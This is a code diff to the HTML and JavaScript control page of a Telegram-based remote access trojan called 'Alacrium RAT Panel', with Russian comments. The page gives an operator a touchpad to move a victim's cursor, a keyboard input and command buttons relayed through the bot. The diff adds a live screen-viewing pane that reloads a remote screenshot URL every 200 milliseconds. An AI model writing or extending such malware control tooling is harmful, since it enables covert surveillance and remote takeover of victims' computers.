@@ -6,7 +6,6 @@
     <title>Alacrium RAT Panel</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* (стили остаются такими же, как в предыдущей версии) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0e17; color: #e0e6f0; padding: 12px; min-height: 100vh; touch-action: manipulation; }
         .container { max-width: 480px; margin: 0 auto; padding-bottom: 20px; }
@@ -23,12 +22,11 @@
         .btn-success { background: rgba(0,200,100,0.1); color: #00cc77; border: 1px solid rgba(0,200,100,0.08); }
         .btn-outline { background: transparent; border: 1px solid rgba(255,255,255,0.08); }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
-        input[type="text"], input[type="number"] { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 10px 12px; font-size: 13px; color: #e0e6f0; width: 100%; outline: none; font-family: inherit; }
+        input[type="text"] { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 10px 12px; font-size: 13px; color: #e0e6f0; width: 100%; outline: none; font-family: inherit; }
         input:focus { border-color: rgba(0,102,255,0.3); }
         input::placeholder { color: rgba(255,255,255,0.2); }
         .input-row { display: flex; gap: 6px; align-items: center; }
         .input-row .btn { flex: 0 0 auto; width: auto; padding: 10px 16px; }
-        .input-small { flex: 1; }
         .touchpad { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; height: 180px; width: 100%; position: relative; touch-action: none; cursor: pointer; overflow: hidden; margin-bottom: 8px; transition: border-color 0.2s ease; }
         .touchpad.active { border-color: rgba(0,212,255,0.3); background: rgba(0,212,255,0.03); }
         .touchpad .cursor-dot { position: absolute; width: 16px; height: 16px; background: rgba(0,212,255,0.5); border-radius: 50%; border: 2px solid rgba(0,212,255,0.8); transform: translate(-50%, -50%); pointer-events: none; box-shadow: 0 0 20px rgba(0,212,255,0.2); transition: background 0.1s ease; }
@@ -36,11 +34,19 @@
         .touchpad .center-label { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: rgba(255,255,255,0.1); font-size: 12px; letter-spacing: 1px; pointer-events: none; }
         .touchpad-controls { display: flex; gap: 6px; }
         .touchpad-controls .btn { flex: 1; font-size: 12px; padding: 8px; }
-        .log { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px 14px; font-family: 'SF Mono', 'Menlo', monospace; font-size: 11px; color: rgba(255,255,255,0.5); min-height: 50px; max-height: 120px; overflow-y: auto; line-height: 1.6; border: 1px solid rgba(255,255,255,0.03); white-space: pre-wrap; word-break: break-word; }
+        .demo-area { width: 100%; background: #000; border-radius: 10px; overflow: hidden; margin-bottom: 8px; aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center; }
+        .demo-area img { width: 100%; height: 100%; object-fit: contain; }
+        .demo-area .placeholder { color: rgba(255,255,255,0.2); font-size: 14px; }
+        .demo-controls { display: flex; gap: 6px; }
+        .demo-controls .btn { flex: 1; }
+        .log { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px 14px; font-family: monospace; font-size: 11px; color: rgba(255,255,255,0.5); min-height: 50px; max-height: 120px; overflow-y: auto; line-height: 1.6; border: 1px solid rgba(255,255,255,0.03); white-space: pre-wrap; word-break: break-word; }
         .log::-webkit-scrollbar { width: 3px; }
         .log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
         .combo-btns { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
         .combo-btns .btn { flex: 1 0 auto; min-width: 60px; padding: 6px 10px; font-size: 11px; }
+        .demo-url-row { display: flex; gap: 6px; margin-top: 6px; }
+        .demo-url-row input { flex: 1; }
+        .demo-url-row .btn { flex: 0 0 auto; width: auto; }
         @media (max-width: 420px) { body { padding: 8px; } .card { padding: 12px; } .touchpad { height: 150px; } .btn { font-size: 12px; padding: 8px 12px; } }
     </style>
 </head>
@@ -49,6 +55,22 @@
     <div class="header">
         <h1>⚡ Alacrium</h1>
         <span class="status-badge">● LIVE</span>
+    </div>
+
+    <!-- Демонстрация экрана -->
+    <div class="card">
+        <div class="card-title">🖥️ Демонстрация экрана</div>
+        <div class="demo-area" id="demoArea">
+            <span class="placeholder">Нажмите "Start Demo"</span>
+        </div>
+        <div class="demo-controls">
+            <button class="btn btn-success" onclick="sendCmd('/startdemo')">▶️ Start Demo</button>
+            <button class="btn btn-danger" onclick="sendCmd('/stopdemo')">⏹ Stop Demo</button>
+        </div>
+        <div class="demo-url-row">
+            <input type="text" id="demoUrl" placeholder="Вставьте URL от бота (https://...)">
+            <button class="btn btn-primary" onclick="openDemo()">Открыть</button>
+        </div>
     </div>
 
     <!-- Touchpad -->
@@ -66,7 +88,7 @@
         </div>
     </div>
 
-    <!-- Quick Actions -->
+    <!-- Быстрые команды -->
     <div class="card">
         <div class="card-title">📡 Команды</div>
         <div class="grid-2">
@@ -77,7 +99,7 @@
         </div>
     </div>
 
-    <!-- Keyboard -->
+    <!-- Клавиатура -->
     <div class="card">
         <div class="card-title">⌨️ Клавиатура</div>
         <div class="input-row">
@@ -138,9 +160,14 @@
     const logElement = document.getElementById('log');
     const touchpad = document.getElementById('touchpad');
     const cursorDot = document.getElementById('cursorDot');
+    const demoArea = document.getElementById('demoArea');
+    const demoImg = document.createElement('img');
+    demoImg.style.display = 'none';
+    demoArea.appendChild(demoImg);
 
     let isDragging = false;
     let startX = 0, startY = 0;
+    let demoInterval = null;
 
     function log(msg) {
         if (logElement.textContent === 'Готов к работе...' || logElement.textContent === '') {
@@ -156,7 +183,24 @@
         tg.sendData(cmd);
     }
 
-    // Touchpad handlers (как в предыдущей версии)
+    function openDemo() {
+        const url = document.getElementById('demoUrl').value;
+        if (!url) {
+            log('⚠️ Вставьте URL');
+            return;
+        }
+        // Показываем изображение и обновляем его каждые 200 мс
+        if (demoInterval) clearInterval(demoInterval);
+        demoImg.style.display = 'block';
+        demoImg.src = url + '?t=' + Date.now();
+        demoArea.querySelector('.placeholder').style.display = 'none';
+        demoInterval = setInterval(() => {
+            demoImg.src = url + '?t=' + Date.now();
+        }, 200);
+        log('✅ Демка отображается');
+    }
+
+    // Обработчики тачпада
     function handleTouchStart(e) {
         e.preventDefault();
         const touch = e.touches[0];
@@ -205,7 +249,6 @@
     touchpad.addEventListener('touchend', handleTouchEnd, { passive: false });
     touchpad.addEventListener('touchcancel', handleTouchEnd, { passive: false });
 
-    // Mouse events for desktop
     let isMouseDown = false;
     touchpad.addEventListener('mousedown', (e) => {
         isMouseDown = true;
